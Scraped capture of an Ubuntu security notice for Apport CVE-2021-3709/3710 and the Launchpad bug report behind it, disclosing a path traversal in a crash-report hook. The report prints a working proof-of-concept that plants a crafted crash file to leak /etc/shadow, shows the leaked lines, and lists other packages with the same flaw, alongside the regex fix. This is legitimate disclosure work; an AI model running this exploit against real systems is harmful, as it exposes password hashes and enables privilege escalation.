=== Content from ubuntu.com_cbc2d146_20250115_081447.html ===


Your submission was sent successfully!
*Close*

Thank you for contacting us. A member of our team will be in touch shortly.
*Close*

You have successfully unsubscribed!
*Close*

Thank you for signing up for our newsletter!

In these regular emails you will find the latest updates about
Ubuntu and upcoming events where you can meet our team.*Close*

Your preferences have been successfully updated. *Close*

[Canonical Ubuntu](/)

* [Menu](/navigation)

* [Products](/navigation#products-navigation)
* [Use cases](/navigation#use-case-navigation)
* [Support](/navigation#support-navigation)
* [Community](/navigation#community-navigation)
* [Get Ubuntu](/navigation#get-ubuntu-navigation)

[![](https://assets.ubuntu.com/v1/82818827-CoF_white.svg)

Security](/security)

* [ESM](/security/esm)
* [Livepatch](/security/livepatch)
* [Certifications & Hardening](/security/compliance-automation)
* [CVEs](/security/cves)
* [Notices](/security/notices)
* [Docker Images](/security/docker-images)

# USN-5077-2: Apport vulnerabilities

14 September 2021

Several security issues were fixed in Apport.

### Reduce your security exposure

Ubuntu Pro provides ten-year security coverage to 25,000+ packages in Main and Universe repositories, and it is free for up to five machines.

[Learn more about Ubuntu Pro](/pro)

## Releases

* [Ubuntu 16.04 ESM](/security/notices?release=xenial)
* [Ubuntu 14.04 ESM](/security/notices?release=trusty)

## Packages

* [apport](/security/cves?package=apport) - automatically generate crash reports for debugging

## Details

USN-5077-1 fixed several vulnerabilities in Apport. This update provides

the corresponding update for Ubuntu 14.04 ESM and Ubuntu 16.04 ESM.

Original advisory details:

Maik Münch and Stephen Röttger discovered that Apport incorrectly handled

certain information gathering operations. A local attacker could use this

issue to gain read access to arbitrary files, possibly containing sensitive

information.

### Reduce your security exposure

Ubuntu Pro provides ten-year security coverage to 25,000+ packages in Main and Universe repositories, and it is free for up to five machines.

[Learn more about Ubuntu Pro](/pro)

## Update instructions

The problem can be corrected by updating your system to the following package versions:

##### Ubuntu 16.04

* [apport](https://launchpad.net/ubuntu/%2Bsource/apport)
  -
  2.20.1-0ubuntu2.30+esm2
  Available with [Ubuntu Pro](/pro)
* [python-apport](https://launchpad.net/ubuntu/%2Bsource/apport)
  -
  2.20.1-0ubuntu2.30+esm2
  Available with [Ubuntu Pro](/pro)
* [python3-apport](https://launchpad.net/ubuntu/%2Bsource/apport)
  -
  2.20.1-0ubuntu2.30+esm2
  Available with [Ubuntu Pro](/pro)

##### Ubuntu 14.04

* [apport](https://launchpad.net/ubuntu/%2Bsource/apport)
  -
  2.14.1-0ubuntu3.29+esm8
  Available with [Ubuntu Pro](/pro)
* [python-apport](https://launchpad.net/ubuntu/%2Bsource/apport)
  -
  2.14.1-0ubuntu3.29+esm8
  Available with [Ubuntu Pro](/pro)
* [python3-apport](https://launchpad.net/ubuntu/%2Bsource/apport)
  -
  2.14.1-0ubuntu3.29+esm8
  Available with [Ubuntu Pro](/pro)

In general, a standard system update will make all the necessary changes.

## References

* [CVE-2021-3709](/security/CVE-2021-3709)
* [CVE-2021-3710](/security/CVE-2021-3710)

## Related notices

* [USN-5077-1](/security/notices/USN-5077-1)

### Join the discussion

* [Ubuntu security updates mailing list](https://lists.ubuntu.com/mailman/listinfo/ubuntu-hardened)
* [Security announcements mailing list](https://lists.ubuntu.com/mailman/listinfo/ubuntu-security-announce)

### Need help with your security needs?

Ubuntu Pro provides up to ten-year security coverage for over 23,000 open-source packages within the Ubuntu Main and Universe repositories.

[Talk to an expert to find out what would work best for you](/contact-us/form?product=pro)

### Further reading

* *Loading...*

---

## [OpenStack](/openstack) [OpenStack](/openstack)

* [What is OpenStack](/openstack/what-is-openstack)
* [Features](/openstack/features)
* [Managed](/openstack/managed)
* [Consulting](/openstack/consulting)
* [Install](/openstack/install)
* [Support](/openstack/support)

---

## [Ceph](/ceph) [Ceph](/ceph)

* [What is Ceph](/ceph/what-is-ceph)
* [Managed](/ceph/managed)
* [Consulting](/ceph/consulting)
* [Docs](/ceph/docs)
* [Install](/ceph/install)

---

## [Kubernetes](/kubernetes) [Kubernetes](/kubernetes)

* [What is Kubernetes](/kubernetes/what-is-kubernetes)
* [Charmed Kubernetes](/kubernetes/charmed-k8s)
* [Managed](/kubernetes/managed)
* [Install](/kubernetes/install)
* [Docs](/kubernetes/docs)
* [Resources](/kubernetes/resources)

---

## [Managed Services](/managed) [Managed Services](/managed)

* [OpenStack](/openstack/managed)
* [Kubernetes](/kubernetes/managed)
* [Ceph](/ceph/managed)
* [Apps](/managed/apps)
* [Observability](/observability/managed)
* [Firefighting](/managed/firefighting-support)

---

## [AI / ML](/ai) [AI / ML](/ai)

* [MLOps](/ai/mlops)
* [Kubeflow](/ai/what-is-kubeflow)
* [MLflow](/ai/mlflow)
* [Consulting](/ai/consulting)
* [Data Science](/ai/data-science)
* [MLOps workshop](/ai/mlops-workshop)

---

## [Robotics](/robotics) [Robotics](/robotics)

* [What is ROS](/robotics/what-is-ros)
* [ROS ESM](/robotics/ros-esm)
* [Community](/robotics/community)
* [Docs](/robotics/docs)

---

## [IoT](/internet-of-things) [IoT](/internet-of-things)

* [App store](/internet-of-things/appstore)
* [Embedded Linux](/embedded)
* [Management](/internet-of-things/management)

---

## [Ubuntu Core](/core) [Ubuntu Core](/core)

* [Features](/core/features)
* [Success stories](/core/stories)
* [Services](/core/services)
* [Docs](/core/docs)

---

## [Ubuntu Desktop](/desktop) [Ubuntu Desktop](/desktop)

* [Organisations](/desktop/organisations)
* [Developers](/desktop/developers)
* [Flavours](/desktop/flavours)
* [WSL](/desktop/wsl)

---

## [Ubuntu Server](/server) [Ubuntu Server](/server)

* [Hyperscale](/server/hyperscale)
* [Docs](/server/docs)

---

## [Cloud](/cloud) [Cloud](/cloud)

* [What is cloud computing](/cloud/cloud-computing)
* [What is private cloud](/cloud/private-cloud)
* [What is hybrid cloud](/cloud/hybrid-cloud)
* [What is multi-cloud](/cloud/multi-cloud)
* [Public cloud](/cloud/public-cloud)

---

## [Security](/security) [Security](/security)

* [ESM](/security/esm)
* [Livepatch](/security/livepatch)
* [Certifications & Hardening](/security/compliance-automation)
* [CVEs](/security/cves)
* [Notices](/security/notices)
* [Docker Images](/security/docker-images)

---

## [Landscape](/landscape) [Landscape](/landscape)

* [Features](/landscape/features)
* [Managed](/landscape/managed)
* [Compare](/landscape/compare)
* [Install](/landscape/docs/quickstart-deployment)
* [Docs](/landscape/docs)
* [Log in to Landscape](https://landscape.canonical.com/)

---

## [Containers](/containers) [Containers](/containers)

* [What are containers](/containers/what-are-containers)
* [Chiseled Ubuntu](/containers/chiseled)
* [Chiseled and .NET](/containers/chiseled/dotnet)

---

## [Downloads](/download) [Downloads](/download)

* [Desktop](/download/desktop)
* [Server](/download/server)
* [Core](/download/core)
* [Cloud](/download/cloud)

---

## [Support](/support) [Support](/support)

* [Your subscriptions](/pro/dashboard)
* [Account users](/pro/users)
* [Pricing](/pricing/pro)
* [Discourse](https://discourse.ubuntu.com/c/project/ubuntu-pro/116/)

---

## [Observability](/observability) [Observability](/observability)

* [What is observability](/observability/what-is-observability)
* [Managed](/observability/managed)

---

## [Pricing](/pricing) [Pricing](/pricing)

* [Consulting](/pricing/consulting)
* [Desktops](/pricing/desktop)
* [Devices](/pricing/devices)

---

## Solutions

* [AI](https://canonical.com/solutions/ai)
* [Data](https://canonical.com/data)
* [Infrastructure](https://canonical.com/solutions/infrastructure)
* [Secure open source](https://canonical.com/solutions/secure-open-source)

---

## Sectors

* [Automotive](/automotive)
* [Industrial](/industrial)
* [Government](/gov)
* [Telco](/telco)
* [Finance](/financial-services)

---

[Contact us](/contact-us)

* [About us](/about)
* [Community](/community)
* [Careers](https://www.canonical.com/careers)
* [Blog](/blog)
* [Resources](/engage)
* [Press centre](/blog/press-centre)

---

© 2025 Canonical Ltd.

Ubuntu and Canonical are registered trademarks of Canonical Ltd.

---

* [Legal information](/legal)
* [Data privacy](/legal/data-privacy)
* Manage your tracker settings
* [Report a bug on this site](https://github.com/canonical/ubuntu.com/issues/new?template=ISSUE_TEMPLATE.yaml)

Back to top

Go to the top of the page



=== Content from bugs.launchpad.net_27ee21c5_20250115_081446.html ===

[Log in / Register](https://bugs.launchpad.net/ubuntu/%2Bsource/apport/%2Bbug/1933832/%2Blogin)

[![](https://launchpadlibrarian.net/606381979/CoF%2064px.png)](https://launchpad.net/ubuntu)

## [Ubuntu](https://launchpad.net/ubuntu)[apport package](https://launchpad.net/ubuntu/%2Bsource/apport)

* [Overview](https://launchpad.net/ubuntu/%2Bsource/apport)
* [Code](https://code.launchpad.net/ubuntu/%2Bsource/apport)
* [Bugs](https://bugs.launchpad.net/ubuntu/%2Bsource/apport)
* Blueprints
* [Translations](https://translations.launchpad.net/ubuntu/%2Bsource/apport)
* [Answers](https://answers.launchpad.net/ubuntu/%2Bsource/apport)

# Path traversal leads to arbitrary file read

Bug #1933832 reported by
[mal](https://launchpad.net/~mallle)
on 2021-06-28

[260](/%2Bhelp-bugs/bug-heat.html)

This bug affects 1 person

| Affects | | Status | Importance | Assigned to | Milestone |
| --- | --- | --- | --- | --- | --- |
|  | [Apport](https://bugs.launchpad.net/apport) | Fix Released | Critical | Unassigned | [Apport 2.21.0](https://launchpad.net/apport/%2Bmilestone/2.21.0) |
|  | [apport (Ubuntu)](https://bugs.launchpad.net/ubuntu/%2Bsource/apport "Latest release: 2.31.0-0ubuntu2, uploaded to main on 2024-12-21 12:23:10.144735+00:00 by Julian Andres Klode (juliank), maintained by Ubuntu Developers (ubuntu-devel-discuss-lists)") | Fix Released | Undecided | Unassigned |  |
|  | [openjdk-13 (Ubuntu)](https://bugs.launchpad.net/ubuntu/%2Bsource/openjdk-13 "Latest release: 13.0.7+5-0ubuntu1~20.04, uploaded to main on 2021-04-21 05:40:09.107984+00:00 by Matthias Klose (doko), maintained by OpenJDK Team (openjdk-13)") | Won't Fix | Undecided | Unassigned |  |
|  | [openjdk-14 (Ubuntu)](https://bugs.launchpad.net/ubuntu/%2Bsource/openjdk-14 "No current release for this source package in Ubuntu") | Won't Fix | Undecided | Unassigned |  |
|  | [openjdk-15 (Ubuntu)](https://bugs.launchpad.net/ubuntu/%2Bsource/openjdk-15 "No current release for this source package in Ubuntu") | Won't Fix | Undecided | Unassigned |  |
|  | [openjdk-16 (Ubuntu)](https://bugs.launchpad.net/ubuntu/%2Bsource/openjdk-16 "Latest release: 16.0.1+9-1~20.04, uploaded to main on 2021-04-21 04:26:09.314868+00:00 by Matthias Klose (doko), maintained by OpenJDK Team (openjdk-16)") | Won't Fix | Undecided | Unassigned |  |
|  | [openjdk-17 (Ubuntu)](https://bugs.launchpad.net/ubuntu/%2Bsource/openjdk-17 "Latest release: 17.0.14~6ea-1, uploaded to main on 2024-12-20 16:36:24.667761+00:00 by OpenJDK Team (openjdk-17), maintained by OpenJDK Team (openjdk-17)") | Won't Fix | Undecided | Unassigned |  |
|  | [openjdk-18 (Ubuntu)](https://bugs.launchpad.net/ubuntu/%2Bsource/openjdk-18 "Latest release: 18.0.2+9-2ubuntu1, uploaded to universe on 2023-03-02 05:47:11.260670+00:00 by Vladimir Petko (vpa1977), maintained by Ubuntu Developers (ubuntu-devel-discuss-lists)") | Won't Fix | Undecided | Unassigned |  |
|  | [openjdk-8 (Ubuntu)](https://bugs.launchpad.net/ubuntu/%2Bsource/openjdk-8 "Latest release: 8u432-ga~us1-0ubuntu1, uploaded to universe on 2024-10-30 09:09:09.993203+00:00 by Pushkar Kulkarni (pushkarnk), maintained by Ubuntu Developers (ubuntu-devel-discuss-lists)") | Won't Fix | Undecided | Unassigned |  |
|  | [xorg (Ubuntu)](https://bugs.launchpad.net/ubuntu/%2Bsource/xorg "Latest release: 1:7.7+23ubuntu3, uploaded to main on 2024-04-08 16:26:28.350584+00:00 by Julian Andres Klode (juliank), maintained by Ubuntu X-SWAT (ubuntu-x-lists)") | Won't Fix | Undecided | Unassigned |  |

### Bug Description

While reiterating the issues reported in <https://bugs.launchpad.net/bugs/1917904>, Stephen Röttger (@\_tsuro) mentioned, that the second issue "Arbitrary file read in package-hooks/source\_xorg.py (Info)" might additionally contain a path traversal vulnerability. This was confirmed by developing a PoC, that enables a user to read arbitrary files in the context of the root user, leading to elevation of privileges. Exploiting this issue requires, that automatic crash reporting is enabled.

The following excerpt of the file `package-hooks/source\_xorg.py` shows the vulnerable code:

if True or report.get('SourcePackage','Unknown') == "compiz" and "ProcStatus" in report:

    compiz\_pid = 0

    pid\_line = re.search("Pid:\t(.\*)\n", report["ProcStatus"]) # [0]

    if pid\_line:

        compiz\_pid = pid\_line.groups()[0]

    compiz\_state\_file = '/tmp/compiz\_internal\_state%s' % compiz\_pid # [1]

    attach\_file\_if\_exists(report, compiz\_state\_file, "compiz\_internal\_states")

While in [0] the `pid\_line` is extracted, this value (if successfully matched) is appended to the file path resulting in `compiz\_state\_file` [1], which is subsequently attached to the crash file.

Using a `Pid` such as `JRN/../../../../etc/shadow` therefore results in the file `/etc/shadow` being attached (after creating the directory `/tmp/compiz\_internal\_stateJRN`).

The following POC (tested on 20.04/21.04 Desktop) exploits this issue to read the file `/etc/shadow`:

mkdir /tmp/compiz\_internal\_stateJRN/;pid=$'\tJRN/../../../etc/shadow';cat << EOF > /var/crash/poc.crash

ProblemType: Crash

ExecutablePath: /poc

Package: source\_xorg 123

SourcePackage: compiz

ProcStatus:

 Pid:$pid

 Uid:$pid

EOF

When reading the crash file (after `whoopsie-upload-all` ran), the contents of the file `/etc/shadow` are indeed attached:

grep -A3 compiz\_internal /var/crash/poc.crash

compiz\_internal\_states:

 root:!:18393:0:99999:7:::

 daemon:\*:18375:0:99999:7:::

 bin:\*:18375:0:99999:7:::

Please credit Stephen Röttger (@\_tsuro) in a potential CVE/USN.

Best regards,

Maik

Tags:

[patch](/ubuntu/%2Bsource/apport/%2Bbugs?field.tag=patch)

## Related branches

[lp:~ubuntu-core-dev/ubuntu/impish/apport/ubuntu](https://code.launchpad.net/~ubuntu-core-dev/ubuntu/impish/apport/ubuntu)

## CVE References

* [2021-3709](/bugs/cve/2021-3709 "Function check_attachment_for_errors(...")
* [2021-3710](/bugs/cve/2021-3710 "An information disclosure via path tr...")

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Alex Murray (alexmurray)](https://launchpad.net/~alexmurray) wrote on 2021-06-30: |  |  | [#1](/ubuntu/%2Bsource/apport/%2Bbug/1933832/comments/1) |
| --- | --- | --- | --- |

Thanks for reporting this issue - this file comes from the xserver-xorg source package so I am adding that as an affected package - I also see there is a similar pattern in apport/ui.py itself, plus the openjdk source packages all have similar logic there too and would likely be affected as well.

In this case it could easily be handled by changing these scripts to be more strict when parsing out the Pid, as follows::

pid\_line = re.search("Pid:\t([0-9]+)\n", report["ProcStatus"])

I'll look at constructing patches based on this approach.

Thanks for reporting this issue - this file comes from the xserver-xorg source package so I am adding that as an affected package - I also see there is a similar pattern in apport/ui.py itself, plus the openjdk source packages all have similar logic there too and would likely be affected as well.
In this case it could easily be handled by changing these scripts to be more strict when parsing out the Pid, as follows::
pid\_line = re.search("Pid:\t([0-9]+)\n", report["ProcStatus"])
I'll look at constructing patches based on this approach.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Alex Murray (alexmurray)](https://launchpad.net/~alexmurray) wrote on 2021-06-30: |  |  | [#2](/ubuntu/%2Bsource/apport/%2Bbug/1933832/comments/2) |
| --- | --- | --- | --- |

[Download full text](https://bugs.launchpad.net/ubuntu/%2Bsource/apport/%2Bbug/1933832/comments/2/%2Bdownload) (5.4 KiB)

For future reference, the other source packages were identified via debian codesearch and looking at unpacked sources for apport and openjdk etc:

codesearch-cli '\bPid:\\t\(\.\\*\)'

path: openjdk-11\_11.0.12+4-1/debian/apport-hook.py

        # attach hs\_err\_<pid>.pid file

        cwd = report['ProcCwd']

        pid\_line = re.search("Pid:\t(.\*)\n", report["ProcStatus"])

        if pid\_line:

            pid = pid\_line.groups()[0]

path: openjdk-17\_17~27-1/debian/apport-hook.py

        # attach hs\_err\_<pid>.pid file

        cwd = report['ProcCwd']

        pid\_line = re.search("Pid:\t(.\*)\n", report["ProcStatus"])

        if pid\_line:

            pid = pid\_line.groups()[0]

path: openjdk-15\_15.0.3+3-1/debian/apport-hook.py

        # attach hs\_err\_<pid>.pid file

        cwd = report['ProcCwd']

        pid\_line = re.search("Pid:\t(.\*)\n", report["ProcStatus"])

        if pid\_line:

            pid = pid\_line.groups()[0]

path: openjdk-16\_16.0.1+9-1/debian/apport-hook.py

        # attach hs\_err\_<pid>.pid file

        cwd = report['ProcCwd']

        pid\_line = re.search("Pid:\t(.\*)\n", report["ProcStatus"])

        if pid\_line:

            pid = pid\_line.groups()[0]

path: openjdk-8\_8u292-b10-3/debian/apport-hook.py

        # attach hs\_err\_<pid>.pid file

        cwd = report['ProcCwd']

        pid\_line = re.search("Pid:\t(.\*)\n", report["ProcStatus"])

        if pid\_line:

            pid = pid\_line.groups()[0]

--

Files grepped: 8

$ rg 'Pid:\\t\(\.\\*\)' \*

xorg/bionic/xorg-7.7+19ubuntu7.1/debian/source\_xorg.py

432: pid\_line = re.search("Pid:\t(.\*)\n", report["ProcStatus"])

xorg/impish/xorg-7.7+22ubuntu1/debian/source\_xorg.py

432: pid\_line = re.search("Pid:\t(.\*)\n", report["ProcStatus"])

xorg/focal/xorg-7.7+19ubuntu14/debian/source\_xorg.py

432: pid\_line = re.search("Pid:\t(.\*)\n", report["ProcStatus"])

xorg/hirsute/xorg-7.7+22ubuntu1/debian/source\_xorg.py

432: pid\_line = re.search("Pid:\t(.\*)\n", report["ProcStatus"])

xorg/groovy/xorg-7.7+19ubuntu15/debian/source\_xorg.py

432: pid\_line = re.search("Pid:\t(.\*)\n", report["ProcStatus"])

openjdk-8/bionic/openjdk-8-8u292-b10/debian/apport-hook.py

24: pid\_line = re.search("Pid:\t(.\*)\n", report["ProcStatus"])

openjdk-8/groovy/openjdk-8-8u292-b10/debian/apport-hook.py

24: pid\_line = re.search("Pid:\t(.\*)\n", report["ProcStatus"])

openjdk-8/focal/openjdk-8-8u292-b10/debian/apport-hook.py

24: pid\_line = re.search("Pid:\t(.\*)\n", report["ProcStatus"])

openjdk-8/impish/openjdk-8-8u292-b10/debian/apport-hook.py

24: pid\_line = re.search("Pid:\t(.\*)\n", report["ProcStatus"])

openjdk-8/xenial/openjdk-8-8u292-b10/debian/apport-hook.py

24: pid\_line = re.search("Pid:\t(.\*)\n", report["ProcStatus"])

openjdk-8/hirsute/openjdk-8-8u292-b10/debian/apport-hook.py

24: pid\_line = re.search("Pid:\t(.\*)\n", report["ProcStatus"])

openjdk-18/impish/openjdk-18-18~2/debian/apport-hook.py

24: pid\_line = re.search("Pid:\t(.\*)\n", report["ProcStatus"])

openjdk-15/hirsute/openjdk-15-15.0.3+3/debian/apport-hook.py

24: pid\_line = re.search("Pid:\t(.\*)\n", report["ProcStatus"])

openjdk-15/groovy/openjdk-15-15.0.3+3/debian/apport-hook.py

24: ...

[Read more...](/ubuntu/%2Bsource/apport/%2Bbug/1933832/comments/2)

For future reference, the other source packages were identified via debian codesearch and looking at unpacked sources for apport and openjdk etc:
codesearch-cli '\bPid:\\t\(\.\\*\)'
path: openjdk-11\_11.0.12+4-1/debian/apport-hook.py
# attach hs\_err\_<pid>.pid file
cwd = report['ProcCwd']
pid\_line = re.search("Pid:\t(.\*)\n", report["ProcStatus"])
if pid\_line:
pid = pid\_line.groups()[0]
path: openjdk-17\_17~27-1/debian/apport-hook.py
# attach hs\_err\_<pid>.pid file
cwd = report['ProcCwd']
pid\_line = re.search("Pid:\t(.\*)\n", report["ProcStatus"])
if pid\_line:
pid = pid\_line.groups()[0]
path: openjdk-15\_15.0.3+3-1/debian/apport-hook.py
# attach hs\_err\_<pid>.pid file
cwd = report['ProcCwd']
pid\_line = re.search("Pid:\t(.\*)\n", report["ProcStatus"])
if pid\_line:
pid = pid\_line.groups()[0]
path: openjdk-16\_16.0.1+9-1/debian/apport-hook.py
# attach hs\_err\_<pid>.pid file
cwd = report['ProcCwd']
pid\_line = re.search("Pid:\t(.\*)\n", report["ProcStatus"])
if pid\_line:
pid = pid\_line.groups()[0]
path: openjdk-8\_8u292-b10-3/debian/apport-hook.py
# attach hs\_err\_<pid>.pid file
cwd = report['ProcCwd']
pid\_line = re.search("Pid:\t(.\*)\n", report["ProcStatus"])
if pid\_line:
pid = pid\_line.groups()[0]
--
Files grepped: 8
$ rg 'Pid:\\t\(\.\\*\)' \*
xorg/bionic/xorg-7.7+19ubuntu7.1/debian/source\_xorg.py
432: pid\_line = re.search("Pid:\t(.\*)\n", report["ProcStatus"])
xorg/impish/xorg-7.7+22ubuntu1/debian/source\_xorg.py
432: pid\_line = re.search("Pid:\t(.\*)\n", report["ProcStatus"])
xorg/focal/xorg-7.7+19ubuntu14/debian/source\_xorg.py
432: pid\_line = re.search("Pid:\t(.\*)\n", report["ProcStatus"])
xorg/hirsute/xorg-7.7+22ubuntu1/debian/source\_xorg.py
432: pid\_line = re.search("Pid:\t(.\*)\n", report["ProcStatus"])
xorg/groovy/xorg-7.7+19ubuntu15/debian/source\_xorg.py
432: pid\_line = re.search("Pid:\t(.\*)\n", report["ProcStatus"])
openjdk-8/bionic/openjdk-8-8u292-b10/debian/apport-hook.py
24: pid\_line = re.search("Pid:\t(.\*)\n", report["ProcStatus"])
openjdk-8/groovy/openjdk-8-8u292-b10/debian/apport-hook.py
24: pid\_line = re.search("Pid:\t(.\*)\n", report["ProcStatus"])
openjdk-8/focal/openjdk-8-8u292-b10/debian/apport-hook.py
24: pid\_line = re.search("Pid:\t(.\*)\n", report["ProcStatus"])
openjdk-8/impish/openjdk-8-8u292-b10/debian/apport-hook.py
24: pid\_line = re.search("Pid:\t(.\*)\n", report["ProcStatus"])
openjdk-8/xenial/openjdk-8-8u292-b10/debian/apport-hook.py
24: pid\_line = re.search("Pid:\t(.\*)\n", report["ProcStatus"])
openjdk-8/hirsute/openjdk-8-8u292-b10/debian/apport-hook.py
24: pid\_line = re.search("Pid:\t(.\*)\n", report["ProcStatus"])
openjdk-18/impish/openjdk-18-18~2/debian/apport-hook.py
24: pid\_line = re.search("Pid:\t(.\*)\n", report["ProcStatus"])
openjdk-15/hirsute/openjdk-15-15.0.3+3/debian/apport-hook.py
24: pid\_line = re.search("Pid:\t(.\*)\n", report["ProcStatus"])
openjdk-15/groovy/openjdk-15-15.0.3+3/debian/apport-hook.py
24: pid\_line = re.search("Pid:\t(.\*)\n", report["ProcStatus"])
openjdk-14/groovy/openjdk-14-14.0.2+12/debian/apport-hook.py
24: pid\_line = re.search("Pid:\t(.\*)\n", report["ProcStatus"])
openjdk-16/impish/openjdk-16-16.0.1+9/debian/apport-hook.py
24: pid\_line = re.search("Pid:\t(.\*)\n", report["ProcStatus"])
openjdk-14/focal/openjdk-14-14.0.2+12/debian/apport-hook.py
24: pid\_line = re.search("Pid:\t(.\*)\n", report["ProcStatus"])
openjdk-15/impish/openjdk-15-15.0.3+3/debian/apport-hook.py
24: pid\_line = re.search("Pid:\t(.\*)\n", report["ProcStatus"])
openjdk-16/groovy/openjdk-16-16.0.1+9/debian/apport-hook.py
24: pid\_line = re.search("Pid:\t(.\*)\n", report["ProcStatus"])
openjdk-13/groovy/openjdk-13-13.0.7+5/debian/apport-hook.py
24: pid\_line = re.search("Pid:\t(.\*)\n", report["ProcStatus"])
openjdk-17/impish/openjdk-17-17~24/debian/apport-hook.py
24: pid\_line = re.search("Pid:\t(.\*)\n", report["ProcStatus"])
openjdk-16/focal/openjdk-16-16.0.1+9/debian/apport-hook.py
24: pid\_line = re.search("Pid:\t(.\*)\n", report["ProcStatus"])
openjdk-17/hirsute/openjdk-17-17~19/debian/apport-hook.py
24: pid\_line = re.search("Pid:\t(.\*)\n", report["ProcStatus"])
openjdk-13/focal/openjdk-13-13.0.7+5/debian/apport-hook.py
24: pid\_line = re.search("Pid:\t(.\*)\n", report["ProcStatus"])
openjdk-16/hirsute/openjdk-16-16.0.1+9/debian/apport-hook.py
24: pid\_line = re.search("Pid:\t(.\*)\n", report["ProcStatus"])
apport/bionic/apport-2.20.9/apport/ui.py
54: pid = re.search('Pid:\t(.\*)\n', report.get('ProcStatus', '')).group(1)
apport/groovy/apport-2.20.11/apport/ui.py
54: pid = re.search('Pid:\t(.\*)\n', report.get('ProcStatus', '')).group(1)
apport/focal/apport-2.20.11/apport/ui.py
54: pid = re.search('Pid:\t(.\*)\n', report.get('ProcStatus', '')).group(1)
apport/hirsute/apport-2.20.11/apport/ui.py
54: pid = re.search('Pid:\t(.\*)\n', report.get('ProcStatus', '')).group(1)
apport/impish/apport-2.20.11/apport/ui.py
54: pid = re.search('Pid:\t(.\*)\n', report.get('ProcStatus', '')).group(1)
apport/trusty/apport-2.14.1/apport/ui.py
53: pid = re.search('Pid:\t(.\*)\n', report.get('ProcStatus', '')).group(1)
apport/xenial/apport-2.20.1/apport/ui.py
53: pid = re.search('Pid:\t(.\*)\n', report.get('ProcStatus', '')).group(1)

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Alex Murray (alexmurray)](https://launchpad.net/~alexmurray) wrote on 2021-06-30: |  |  | [#3](/ubuntu/%2Bsource/apport/%2Bbug/1933832/comments/3) |
| --- | --- | --- | --- |

[Download full text](https://bugs.launchpad.net/ubuntu/%2Bsource/apport/%2Bbug/1933832/comments/3/%2Bdownload) (3.3 KiB)

I also went looking for instances of attach\_file() which may be vulnerable to this type of attack (ie using a computed filename that may be able to be influenced by untrusted content from the report) by searching for calls to this across the entire debian archive which use a variable name for the file-name argument:

$ codesearch-cli "attach\_file(\_if\_exists)?\(report($|,$|, [a-z])"

path: grub2\_2.04-19/debian/apport/source\_grub2.py

                       and not check\_shell\_syntax(fullpath):

                        invalid\_grub\_script.append(fullpath)

     91 attach\_file(report, fullpath)

path: gnome-shell\_3.38.4-1/debian/source\_gnome-shell.py

                monitors = os.path.expanduser('~/.config/monitors.xml')

     28 attach\_file\_if\_exists(report, monitors, 'monitors.xml')

path: dkms\_2.8.4-4/dkms\_apport.py

        report['PackageVersion'] = version

        report['Title'] = "%s %s: %s kernel module failed to build" % (package, version, options.module)

     84 attach\_file\_if\_exists(report, make\_log, 'DKMSBuildLog')

path: dkms\_2.8.4-4/dkms\_apport.py

        if report['SourcePackage'] == 'fglrx-installer':

            fglrx\_make\_log = os.path.join('/var','lib','dkms',options.module,options.version,'build','make.sh.log')

     80 attach\_file\_if\_exists(report, fglrx\_make\_log, 'FglrxBuildLog')

path: shim-signed\_1.37/debian/source\_shim-signed.py

            attach\_file(report, '/proc/sys/kernel/moksbstate\_disabled')

            attach\_file(report, sb\_var)

     55 attach\_file(report, mok\_var)

path: shim-signed\_1.37/debian/source\_shim-signed.py

            attach\_file(report, '/proc/sys/kernel/moksbstate\_disabled')

     54 attach\_file(report, sb\_var)

path: plank\_0.11.89-3/data/apport/source\_plank.py

        def add\_info(report, ui=None):

     27 attach\_file\_if\_exists(report, path.expanduser('~/.config/plank/dock1/settings'), 'DockSettings')

path: gnome-shell-xrdesktop\_3.36.1-2/debian/source\_gnome-shell.py

                monitors = os.path.expanduser('~/.config/monitors.xml')

     28 attach\_file\_if\_exists(report, monitors, 'monitors.xml')

path: conky\_1.11.6-2/debian/conky.py

                conkyrc\_path = path.expanduser('~/.conkyrc')

                if path.exists(conkyrc\_path):

     17 attach\_file(report, conkyrc\_path)

path: conky\_1.11.6-2/debian/conky.py

                                           open(conkyrc\_path).read(),

                                           re.MULTILINE):

     21 attach\_file\_if\_exists(report, file)

path: vsftpd\_3.0.3-13/debian/vsftpd.apport

                attach\_conffiles(report,'vsftpd')

     30 attach\_file\_if\_exists(report, os.path.expanduser('/var/log/vsftpd.log'), 'vsftpd.log')

path: rednotebook\_2.21+ds-1/debian/source\_rednotebook.py

            for (key, name) in LOGS:

                log = path.join(rednotebook\_dir, name)

     22 attach\_file\_if\_exists(report, log, key)

path: shotwell\_0.30.11-1/apport/shotwell.py

        def add\_info(report):

            log\_file = os.path.expanduser('~/.cache/shotwell/shotwell.log')

      6 apport.hookutils.attach\_file\_if\_exists(report, log\_file, 'shotwell.log')

Of these, the conky script also appear...

[Read more...](/ubuntu/%2Bsource/apport/%2Bbug/1933832/comments/3)

I also went looking for instances of attach\_file() which may be vulnerable to this type of attack (ie using a computed filename that may be able to be influenced by untrusted content from the report) by searching for calls to this across the entire debian archive which use a variable name for the file-name argument:
$ codesearch-cli "attach\_file(\_if\_exists)?\(report($|,$|, [a-z])"
path: grub2\_2.04-19/debian/apport/source\_grub2.py
and not check\_shell\_syntax(fullpath):
invalid\_grub\_script.append(fullpath)
91 attach\_file(report, fullpath)
path: gnome-shell\_3.38.4-1/debian/source\_gnome-shell.py
monitors = os.path.expanduser('~/.config/monitors.xml')
28 attach\_file\_if\_exists(report, monitors, 'monitors.xml')
path: dkms\_2.8.4-4/dkms\_apport.py
report['PackageVersion'] = version
report['Title'] = "%s %s: %s kernel module failed to build" % (package, version, options.module)
84 attach\_file\_if\_exists(report, make\_log, 'DKMSBuildLog')
path: dkms\_2.8.4-4/dkms\_apport.py
if report['SourcePackage'] == 'fglrx-installer':
fglrx\_make\_log = os.path.join('/var','lib','dkms',options.module,options.version,'build','make.sh.log')
80 attach\_file\_if\_exists(report, fglrx\_make\_log, 'FglrxBuildLog')
path: shim-signed\_1.37/debian/source\_shim-signed.py
attach\_file(report, '/proc/sys/kernel/moksbstate\_disabled')
attach\_file(report, sb\_var)
55 attach\_file(report, mok\_var)
path: shim-signed\_1.37/debian/source\_shim-signed.py
attach\_file(report, '/proc/sys/kernel/moksbstate\_disabled')
54 attach\_file(report, sb\_var)
path: plank\_0.11.89-3/data/apport/source\_plank.py
def add\_info(report, ui=None):
